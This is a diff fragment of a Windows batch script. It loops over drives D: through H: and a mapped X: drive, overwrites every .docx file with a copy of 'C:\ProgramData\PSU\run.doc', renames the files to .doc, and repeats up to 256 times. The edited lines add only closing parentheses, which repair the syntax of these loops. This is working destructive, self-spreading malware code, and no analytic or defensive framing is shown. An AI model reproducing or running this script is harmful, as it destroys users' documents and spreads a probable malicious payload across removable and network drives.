@@ -9,15 +9,15 @@ if exist X: (for /f "delims=" %%h in ('dir X:\*.docx /b') do copy /Y "C:\Program
 for /R "X:" %%f in (*.docx) do ren "%%f" *.doc
 net use X: /delete)))
 if exist D: (for /f "delims=" %%h in ('dir D:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "D:\%%h"
-for /R "D:" %%f in (*.docx) do ren "%%f" *.doc
+for /R "D:" %%f in (*.docx) do ren "%%f" *.doc)
 if exist E: (for /f "delims=" %%h in ('dir E:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "E:\%%h"
-for /R "E:" %%f in (*.docx) do ren "%%f" *.doc
+for /R "E:" %%f in (*.docx) do ren "%%f" *.doc)
 if exist F: (for /f "delims=" %%h in ('dir F:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "F:\%%h"
-for /R "F:" %%f in (*.docx) do ren "%%f" *.doc
+for /R "F:" %%f in (*.docx) do ren "%%f" *.doc)
 if exist G: (for /f "delims=" %%h in ('dir G:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "G:\%%h"
-for /R "G:" %%f in (*.docx) do ren "%%f" *.doc
+for /R "G:" %%f in (*.docx) do ren "%%f" *.doc)
 if exist H: (for /f "delims=" %%h in ('dir H:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "H:\%%h"
-for /R "H:" %%f in (*.docx) do ren "%%f" *.doc
+for /R "H:" %%f in (*.docx) do ren "%%f" *.doc)
 if %ii% == 256 (goto next) else (set /a ii=ii+1)
 goto run
 :next
